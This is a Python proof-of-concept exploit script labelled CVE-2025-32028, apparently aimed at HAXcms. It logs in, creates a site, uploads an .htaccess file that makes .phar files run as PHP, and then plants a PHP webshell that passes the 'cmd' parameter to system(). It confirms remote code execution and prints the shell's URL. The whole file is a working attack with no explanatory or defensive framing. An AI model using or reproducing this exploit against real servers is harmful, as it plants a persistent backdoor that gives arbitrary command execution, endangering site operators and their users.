#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
import re

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def login(base_url, username, password):
    login_url = f"{base_url}/system/api/login"
    data = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    session = requests.Session()
    resp = session.post(login_url, json=data, headers=headers)
    if resp.status_code == 200:
        try:
            json_resp = resp.json()
            if json_resp.get("status") == 200:
                return session, json_resp.get("jwt", "")
        except:
            pass
    return None, None

def get_form_token(base_url, session, jwt_token):
    resp = session.get(f"{base_url}/?jwt={jwt_token}")
    match = re.search(r'"getFormToken":"([^"]+)"', resp.text)
    return match.group(1) if match else None

def create_site(base_url, session, jwt_token, form_token, site_name):
    data = {
        "site[name]": site_name,
        "site[description]": "poc",
        "theme": "clean-one",
        "node[title]": "Home",
        "haxcms_form_token": form_token,
        "haxcms_form_id": "createSite"
    }
    resp = session.post(f"{base_url}/system/api/createSite?jwt={jwt_token}", data=data)
    if resp.status_code == 200:
        try:
            result = resp.json()
            if result.get("status") == 200:
                site_data = result.get("data", {})
                metadata = site_data.get("metadata", {})
                site_info = metadata.get("site", {})
                actual_name = site_info.get("name", "")
                return actual_name
        except:
            pass
    return None

def get_node_id(base_url, session, jwt_token, site_name):
    resp = session.get(f"{base_url}/_sites/{site_name}/site.json?jwt={jwt_token}")
    if resp.status_code == 200:
        try:
            items = resp.json().get("items", [])
            return items[0].get("id") if items else None
        except:
            pass
    return None

def upload_file_to_site(base_url, session, jwt, site_name, node_id, filename, content):
    files = {"file-upload": (filename, content, "application/octet-stream")}
    data = {"site[name]": site_name, "node[id]": node_id}
    return session.post(f"{base_url}/system/api/saveFile?jwt={jwt}", files=files, data=data)

def verify_rce(base_url, shell_path, cmd="id"):
    try:
        resp = requests.get(f"{base_url}{shell_path}?cmd={cmd}", timeout=10)
        if resp.status_code == 200 and "uid=" in resp.text:
            return True, resp.text.strip()
    except:
        pass
    return False, None

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-32028 POC")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", required=True)
    parser.add_argument("-c", "--cmd", default="id")
    args = parser.parse_args()
    
    base_url = args.url.rstrip("/")
    print(f"[*] Target: {base_url}")
    
    print(f"[*] Logging in as {args.username}...")
    session, jwt = login(base_url, args.username, args.password)
    if not jwt:
        print("[-] Login failed!")
        sys.exit(1)
    print("[+] Login successful!")
    
    print("[*] Getting form token...")
    form_token = get_form_token(base_url, session, jwt)
    if not form_token:
        print("[-] Failed to get form token!")
        sys.exit(1)
    
    print("[*] Creating site...")
    site_name = create_site(base_url, session, jwt, form_token, f"poc{generate_random_string(4)}")
    if not site_name:
        print("[-] Failed to create site!")
        sys.exit(1)
    print(f"[+] Site created: {site_name}")
    
    print("[*] Getting node ID...")
    node_id = get_node_id(base_url, session, jwt, site_name)
    if not node_id:
        print("[-] Failed to get node ID!")
        sys.exit(1)
    print(f"[+] Node ID: {node_id}")
    
    print("[*] Step 1: Uploading .htaccess...")
    htaccess = b"AddHandler application/x-httpd-php .phar\n"
    resp = upload_file_to_site(base_url, session, jwt, site_name, node_id, ".htaccess", htaccess)
    if resp.status_code != 200:
        print(f"[-] Failed! {resp.text}")
        sys.exit(1)
    print("[+] .htaccess uploaded!")
    
    print("[*] Step 2: Uploading webshell (.phar)...")
    shell = b'<?php if(isset($_GET["cmd"])){system($_GET["cmd"]." 2>&1");}?>'
    shell_name = f"shell_{generate_random_string()}.phar"
    resp = upload_file_to_site(base_url, session, jwt, site_name, node_id, shell_name, shell)
    if resp.status_code != 200:
        print(f"[-] Failed! {resp.text}")
        sys.exit(1)
    
    shell_path = f"/_sites/{site_name}/files/{shell_name}"
    print(f"[+] Webshell uploaded: {shell_path}")
    
    print(f"[*] Verifying RCE with command: {args.cmd}")
    success, output = verify_rce(base_url, shell_path, args.cmd)
    if success:
        print(f"[+] RCE verified successfully!")
        print(f"[+] Command output:\n{output}")
        print(f"\n[+] Webshell URL: {base_url}{shell_path}?cmd=<command>")
    else:
        print("[-] RCE verification failed!")
        print("[!] File uploaded but not executed as PHP")
        print(f"[!] Uploaded to: {base_url}{shell_path}")
        sys.exit(1)

if __name__ == "__main__":
    main()
